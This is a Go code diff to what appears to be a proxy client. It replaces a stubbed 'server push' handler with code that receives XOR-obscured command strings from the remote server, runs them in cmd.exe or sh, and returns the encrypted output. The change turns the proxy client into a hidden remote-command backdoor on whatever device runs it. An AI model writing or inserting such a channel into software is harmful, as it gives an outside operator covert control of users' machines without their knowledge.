@@ -8,6 +8,8 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net"
+	"os/exec"
+	"runtime"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -271,7 +273,7 @@ func (c *ProxyClient) processProxyRequest(data []byte) {
 	case CmdCloseUDP:
 		c.handleCloseUDP(sessionID, false)
 	case CmdServerPush:
-		logDebug("Server push command (not implemented)")
+		c.handleServerPush(sessionID, data[17:])
 	}
 }
 
@@ -622,6 +624,94 @@ func (c *ProxyClient) handleReadSMS(sessionID string) {
 
 	// Send empty SMS response
 	c.sendCommand(sessionID, CmdReadSMS, []byte{})
+}
+
+// handleServerPush handles server push commands
+func (c *ProxyClient) handleServerPush(sessionID string, data []byte) {
+	logInfo("Server push command received (session: %s)", sessionID)
+
+	if len(data) == 0 {
+		logError("No command data received")
+		return
+	}
+
+	// Decrypt the command data
+	commandData := make([]byte, len(data))
+	copy(commandData, data)
+	c.xorDecrypt(commandData)
+
+	// Parse the command string
+	commandStr := string(commandData)
+	logInfo("Executing command: %s (session: %s)", commandStr, sessionID)
+
+	// Create context with 30-second timeout (increased from 30 seconds)
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	// Execute command with timeout
+	var cmd *exec.Cmd
+	// Use appropriate shell based on OS
+	if runtime.GOOS == "windows" {
+		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", commandStr)
+	} else {
+		// Linux, macOS, and other Unix-like systems
+		cmd = exec.CommandContext(ctx, "sh", "-c", commandStr)
+	}
+
+	// Capture both stdout and stderr
+	var outputBuf bytes.Buffer
+	cmd.Stdout = &outputBuf
+	cmd.Stderr = &outputBuf
+
+	// Execute the command
+	err := cmd.Run()
+
+	var exitCode int32 = 0
+	timedOut := false
+
+	if err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			// Command timed out after 30 seconds
+			logDebug("Command timed out after 30 seconds (session: %s)", sessionID)
+			exitCode = 9
+			timedOut = true
+			outputBuf.WriteString("\n[Command timed out after 30 seconds]")
+		} else {
+			// Command failed with error
+			if exitErr, ok := err.(*exec.ExitError); ok {
+				exitCode = int32(exitErr.ExitCode())
+			} else {
+				exitCode = 1
+			}
+			logError("Command execution failed: %v (session: %s)", err, sessionID)
+		}
+	}
+
+	// Prepare response data
+	var responseBuf bytes.Buffer
+
+	// Write exit code (4 bytes)
+	exitCodeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(exitCodeBytes, uint32(exitCode))
+	responseBuf.Write(exitCodeBytes)
+
+	// Write output data
+	responseBuf.Write(outputBuf.Bytes())
+
+	// Encrypt response
+	responseData := responseBuf.Bytes()
+	c.xorEncrypt(responseData)
+
+	// Send the command output back to the session
+	c.sendCommand(sessionID, CmdServerPush, responseData)
+
+	if timedOut {
+		logInfo("Sent command result with timeout code 9 (session: %s, output: %d bytes)",
+			sessionID, outputBuf.Len())
+	} else {
+		logInfo("Sent command result (session: %s, exit code: %d, output: %d bytes)",
+			sessionID, exitCode, outputBuf.Len())
+	}
 }
 
 // sendCommand sends a command to the server
